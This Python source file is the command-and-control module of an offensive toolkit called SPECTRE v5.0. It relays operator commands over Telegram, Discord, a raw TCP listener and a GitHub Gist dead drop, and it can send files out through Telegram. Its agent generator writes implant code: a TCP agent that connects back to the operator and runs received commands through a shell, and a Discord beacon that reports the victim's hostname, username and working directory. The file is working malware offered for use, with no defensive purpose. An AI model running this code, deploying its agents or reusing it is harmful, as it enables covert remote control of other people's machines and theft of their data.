#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================================
#  SPECTRE v5.0 - MULTI-CHANNEL C2
#  Telegram | Discord | TCP | DeadDrop
#  👻 AUTHOR: イズミー (IZUMI)
# ============================================================

import os
import json
import time
import socket
import threading
from typing import Optional, Dict, List, Callable, Any

from core import cfg, log, C, Utils, Crypto


class BaseC2:
    name = "base"
    def __init__(self, config: dict):
        self.config = config or {}
        self.enabled = self.config.get("enabled", False)
        self._running = False
        self._thread: Optional[threading.Thread] = None
        self._handlers: List[Callable[[str], Optional[str]]] = []

    def is_ready(self) -> bool:
        return self.enabled

    def send(self, message: str, **kwargs) -> bool:
        return False

    def poll(self) -> List[str]:
        return []

    def start_listener(self):
        pass

    def stop(self):
        self._running = False
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=3)

    def register_handler(self, fn: Callable[[str], Optional[str]]):
        self._handlers.append(fn)

    def _dispatch(self, cmd: str) -> str:
        for h in self._handlers:
            try:
                out = h(cmd)
                if out is not None:
                    return str(out)
            except Exception as e:
                log.error(f"C2 handler: {e}")
        return f"[C2] No handler for: {cmd[:50]}"


class TelegramC2(BaseC2):
    name = "telegram"
    def __init__(self, config: dict):
        super().__init__(config)
        self.bot_token = self.config.get("bot_token") or os.getenv("SPECTRE_TG_TOKEN", "")
        self.chat_id = str(self.config.get("chat_id") or os.getenv("SPECTRE_TG_CHAT", ""))
        self.base = f"https://api.telegram.org/bot{self.bot_token}" if self.bot_token else ""
        self.last_update_id = 0
        self.poll_interval = self.config.get("poll_interval", 3)
        self._ready = bool(self.bot_token and self.chat_id)

    def is_ready(self) -> bool:
        return self.enabled and self._ready

    def send(self, message: str, **kwargs) -> bool:
        if not self.is_ready():
            return False
        try:
            import requests
            r = requests.post(f"{self.base}/sendMessage",
                              json={"chat_id": self.chat_id,
                                    "text": message[:4000]},
                              timeout=15)
            return r.status_code == 200
        except Exception as e:
            log.error(f"TG send: {e}")
            return False

    def send_document(self, file_path: str, caption: str = "") -> bool:
        if not self.is_ready():
            return False
        try:
            import requests
            with open(file_path, "rb") as f:
                r = requests.post(f"{self.base}/sendDocument",
                                  data={"chat_id": self.chat_id,
                                        "caption": caption[:1000]},
                                  files={"document": f}, timeout=30)
            return r.status_code == 200
        except Exception as e:
            log.error(f"TG send_doc: {e}")
            return False

    def poll(self) -> List[str]:
        if not self.is_ready():
            return []
        try:
            import requests
            r = requests.get(f"{self.base}/getUpdates",
                             params={"offset": self.last_update_id + 1, "timeout": 5},
                             timeout=15)
            if r.status_code != 200:
                return []
            cmds = []
            for upd in r.json().get("result", []):
                self.last_update_id = max(self.last_update_id,
                                           upd.get("update_id", 0))
                msg = upd.get("message", {})
                text = msg.get("text", "").strip()
                from_chat = str(msg.get("chat", {}).get("id", ""))
                if text and from_chat == self.chat_id:
                    cmds.append(text)
            return cmds
        except Exception as e:
            log.debug(f"TG poll: {e}")
            return []

    def start_listener(self):
        if not self.is_ready() or self._running:
            return
        self._running = True
        def loop():
            log.info("Telegram C2 listener started")
            self.send("🟢 *SPECTRE v5.0 online*")
            while self._running:
                for cmd in self.poll():
                    log.info(f"TG cmd: {cmd[:80]}")
                    out = self._dispatch(cmd)
                    self.send(f"```\n{out[:3500]}\n```")
                time.sleep(self.poll_interval)
        self._thread = threading.Thread(target=loop, daemon=True)
        self._thread.start()


class DiscordC2(BaseC2):
    name = "discord"
    def __init__(self, config: dict):
        super().__init__(config)
        self.webhook = self.config.get("webhook") or os.getenv("SPECTRE_DISCORD", "")
        self.bot_token = self.config.get("bot_token", "")
        self.channel_id = str(self.config.get("channel_id", ""))
        self.base = "https://discord.com/api/v10"
        self.last_msg_id = None
        self.poll_interval = self.config.get("poll_interval", 3)
        self._ready = bool(self.webhook or (self.bot_token and self.channel_id))

    def is_ready(self) -> bool:
        return self.enabled and self._ready

    def send(self, message: str, **kwargs) -> bool:
        if not self.is_ready():
            return False
        try:
            import requests
            if self.webhook:
                r = requests.post(self.webhook,
                                  json={"content": message[:1900]}, timeout=15)
                return r.status_code in (200, 204)
            r = requests.post(
                f"{self.base}/channels/{self.channel_id}/messages",
                headers={"Authorization": f"Bot {self.bot_token}"},
                json={"content": message[:1900]}, timeout=15,
            )
            return r.status_code == 200
        except Exception as e:
            log.error(f"DC send: {e}")
            return False

    def poll(self) -> List[str]:
        if not self.bot_token or not self.channel_id:
            return []
        try:
            import requests
            params = {"limit": 5}
            if self.last_msg_id:
                params["after"] = self.last_msg_id
            r = requests.get(
                f"{self.base}/channels/{self.channel_id}/messages",
                headers={"Authorization": f"Bot {self.bot_token}"},
                params=params, timeout=15,
            )
            if r.status_code != 200:
                return []
            cmds = []
            for m in reversed(r.json()):
                self.last_msg_id = max(self.last_msg_id or "0", m["id"])
                content = m.get("content", "").strip()
                if content.startswith(("🟢", "```")):
                    continue
                if content:
                    cmds.append(content)
            return cmds
        except Exception as e:
            log.debug(f"DC poll: {e}")
            return []

    def start_listener(self):
        if not self.is_ready() or self._running:
            return
        self._running = True
        def loop():
            log.info("Discord C2 listener started")
            self.send("🟢 **SPECTRE v5.0 online**")
            while self._running:
                for cmd in self.poll():
                    log.info(f"DC cmd: {cmd[:80]}")
                    out = self._dispatch(cmd)
                    self.send(f"```\n{out[:1800]}\n```")
                time.sleep(self.poll_interval)
        self._thread = threading.Thread(target=loop, daemon=True)
        self._thread.start()


class TcpC2(BaseC2):
    name = "tcp"
    def __init__(self, config: dict):
        super().__init__(config)
        self.host = self.config.get("host", "0.0.0.0")
        self.port = self.config.get("port", 4444)
        self.encrypt = self.config.get("encrypt", True)
        key_str = self.config.get("key") or Crypto.sha256(b"spectre-v5-c2")[:32]
        self.key = key_str.encode() if isinstance(key_str, str) else key_str
        self.sessions: Dict[str, socket.socket] = {}
        self._lock = threading.Lock()

    def is_ready(self) -> bool:
        return self.enabled

    def send(self, message: str, session_id: Optional[str] = None) -> bool:
        data = message.encode()
        if self.encrypt:
            try:
                data = Crypto.enc(self.key, data)
            except Exception:
                pass
        with self._lock:
            targets = ([self.sessions[session_id]] if session_id in self.sessions
                       else list(self.sessions.values()))
        ok = False
        for s in targets:
            try:
                s.sendall(len(data).to_bytes(4, "big") + data)
                ok = True
            except Exception:
                pass
        return ok

    def _recv_exact(self, sock, n):
        buf = b""
        while len(buf) < n:
            chunk = sock.recv(n - len(buf))
            if not chunk:
                raise ConnectionError("closed")
            buf += chunk
        return buf

    def _handle_client(self, sock, addr):
        sid = f"{addr[0]}:{addr[1]}"
        with self._lock:
            self.sessions[sid] = sock
        log.info(f"TCP C2 client: {sid}")
        try:
            while self._running:
                hdr = self._recv_exact(sock, 4)
                size = int.from_bytes(hdr, "big")
                payload = self._recv_exact(sock, size)
                if self.encrypt:
                    payload = Crypto.dec(self.key, payload)
                cmd = payload.decode(errors="ignore")
                out = self._dispatch(cmd)
                resp = out.encode()
                if self.encrypt:
                    resp = Crypto.enc(self.key, resp)
                sock.sendall(len(resp).to_bytes(4, "big") + resp)
        except Exception as e:
            log.debug(f"TCP client {sid} done: {e}")
        finally:
            with self._lock:
                self.sessions.pop(sid, None)
            try: sock.close()
            except Exception: pass

    def start_listener(self):
        if not self.is_ready() or self._running:
            return
        self._running = True
        def loop():
            srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            try:
                srv.bind((self.host, self.port))
                srv.listen(20)
                srv.settimeout(2.0)
                log.info(f"TCP C2 listening {self.host}:{self.port}")
                while self._running:
                    try:
                        client, addr = srv.accept()
                        threading.Thread(target=self._handle_client,
                                         args=(client, addr), daemon=True).start()
                    except socket.timeout:
                        continue
            except Exception as e:
                log.error(f"TCP listener: {e}")
            finally:
                try: srv.close()
                except Exception: pass
        self._thread = threading.Thread(target=loop, daemon=True)
        self._thread.start()


class DeadDropC2(BaseC2):
    name = "dead_drop"
    def __init__(self, config: dict):
        super().__init__(config)
        self.github_token = self.config.get("github_token", "")
        self.gist_id = self.config.get("gist_id", "")
        self.poll_interval = self.config.get("poll_interval", 30)
        self._ready = bool(self.github_token and self.gist_id)

    def is_ready(self) -> bool:
        return self.enabled and self._ready

    def send(self, message: str, **kwargs) -> bool:
        if not self.is_ready():
            return False
        try:
            import requests
            r = requests.patch(
                f"https://api.github.com/gists/{self.gist_id}",
                headers={"Authorization": f"token {self.github_token}",
                         "Accept": "application/vnd.github+json"},
                json={"files": {"c2.txt": {"content": message[:9000]}}},
                timeout=15,
            )
            return r.status_code == 200
        except Exception as e:
            log.error(f"DeadDrop send: {e}")
            return False

    def poll(self) -> List[str]:
        if not self.is_ready():
            return []
        try:
            import requests
            r = requests.get(
                f"https://api.github.com/gists/{self.gist_id}",
                headers={"Authorization": f"token {self.github_token}"},
                timeout=15,
            )
            if r.status_code != 200:
                return []
            content = ""
            for meta in r.json().get("files", {}).values():
                content += meta.get("content", "")
            return [l[4:].strip() for l in content.splitlines()
                    if l.strip().startswith("CMD:")]
        except Exception as e:
            log.debug(f"DeadDrop poll: {e}")
            return []

    def start_listener(self):
        if not self.is_ready() or self._running:
            return
        self._running = True
        def loop():
            log.info("DeadDrop C2 listener started")
            while self._running:
                for cmd in self.poll():
                    out = self._dispatch(cmd)
                    self.send(f"[{Utils.now()}] {out[:800]}")
                time.sleep(self.poll_interval)
        self._thread = threading.Thread(target=loop, daemon=True)
        self._thread.start()


# ============================================================
# C2 MANAGER
# ============================================================
class C2Manager:
    _instance = None
    _lock = threading.Lock()

    def __new__(cls, *a, **kw):
        with cls._lock:
            if cls._instance is None:
                cls._instance = super().__new__(cls)
                cls._instance._init()
            return cls._instance

    def _init(self):
        self.channels: Dict[str, BaseC2] = {}
        self._loaded = False

    def load(self):
        if self._loaded:
            return
        c2_cfg = cfg.get("c2", {}) or {}

        tg = c2_cfg.get("telegram", {}) or {}
        if tg.get("enabled"):
            c = TelegramC2(tg)
            if c.is_ready():
                self.channels["telegram"] = c
                log.info("Telegram C2 loaded")

        dc = c2_cfg.get("discord", {}) or {}
        if dc.get("enabled"):
            c = DiscordC2(dc)
            if c.is_ready():
                self.channels["discord"] = c
                log.info("Discord C2 loaded")

        tcp = c2_cfg.get("custom_tcp", {}) or {}
        if tcp.get("enabled"):
            c = TcpC2(tcp)
            if c.is_ready():
                self.channels["tcp"] = c
                log.info("TCP C2 loaded")

        dd = c2_cfg.get("dead_drop", {}) or {}
        if dd.get("enabled"):
            c = DeadDropC2(dd)
            if c.is_ready():
                self.channels["dead_drop"] = c
                log.info("DeadDrop C2 loaded")

        self._loaded = True

    def register_default_handler(self, fn):
        for ch in self.channels.values():
            ch.register_handler(fn)

    def start_all(self):
        self.load()
        for name, ch in self.channels.items():
            try:
                ch.start_listener()
                log.info(f"C2 started: {name}")
            except Exception as e:
                log.error(f"Start {name} failed: {e}")

    def stop_all(self):
        for ch in self.channels.values():
            try: ch.stop()
            except Exception: pass

    def broadcast(self, message: str) -> int:
        self.load()
        ok = 0
        for ch in self.channels.values():
            try:
                if ch.send(message):
                    ok += 1
            except Exception:
                pass
        return ok

    def status(self) -> Dict[str, bool]:
        self.load()
        return {n: c.is_ready() for n, c in self.channels.items()}


_c2: Optional[C2Manager] = None
_c2_lock = threading.Lock()


def c2() -> C2Manager:
    global _c2
    with _c2_lock:
        if _c2 is None:
            _c2 = C2Manager()
        return _c2


# ============================================================
# AGENT GENERATOR
# ============================================================
class AgentGenerator:
    @staticmethod
    def tcp_agent(host: str, port: int, key: str = "") -> str:
        key = key or Crypto.sha256(b"spectre-v5-c2")[:32]
        return f'''#!/usr/bin/env python3
# SPECTRE v5 TCP Agent
import socket, subprocess, os, time
from cryptography.fernet import Fernet

HOST = "{host}"
PORT = {port}
KEY = {key!r}

def _recv(s, n):
    b = b""
    while len(b) < n:
        c = s.recv(n - len(b))
        if not c: raise ConnectionError()
        b += c
    return b

def exec_cmd(cmd):
    try:
        return subprocess.check_output(cmd, shell=True,
                                       stderr=subprocess.STDOUT,
                                       text=True, timeout=60)
    except Exception as e:
        return f"Error: {{e}}"

def run():
    f = Fernet(KEY)
    while True:
        try:
            s = socket.socket()
            s.connect((HOST, PORT))
            while True:
                hdr = _recv(s, 4)
                size = int.from_bytes(hdr, "big")
                payload = f.decrypt(_recv(s, size)).decode()
                out = exec_cmd(payload).encode()
                enc = f.encrypt(out)
                s.sendall(len(enc).to_bytes(4, "big") + enc)
        except Exception:
            time.sleep(10)

if __name__ == "__main__":
    run()
'''

    @staticmethod
    def discord_agent(webhook: str) -> str:
        return f'''#!/usr/bin/env python3
# SPECTRE v5 Discord Beacon
import requests, socket, os, time, subprocess

WEBHOOK = "{webhook}"

def beacon():
    info = dict(host=socket.gethostname(),
                user=os.getenv("USER") or os.getenv("USERNAME") or "?",
                cwd=os.getcwd())
    requests.post(WEBHOOK, json={{"content": f"🟢 AGENT UP: {{info}}"}}, timeout=10)

if __name__ == "__main__":
    beacon()
    while True:
        time.sleep(60)
        requests.post(WEBHOOK, json={{"content": f"💓 {{int(time.time())}}"}}, timeout=10)
'''


# ============================================================
# SELF-TEST
# ============================================================
if __name__ == "__main__":
    print(C.a("C2 self-test"))
    mgr = c2()
    mgr.load()
    print(C.i(f"Channels: {mgr.status()}"))
    if mgr.channels:
        n = mgr.broadcast("🧪 SPECTRE v5 C2 test")
        print(C.s(f"Broadcast: {n} channel(s)"))
    agent = AgentGenerator.tcp_agent("10.0.0.5", 4444)
    print(C.s(f"TCP agent: {len(agent)} bytes"))
    print(C.h("C2 done 💀"))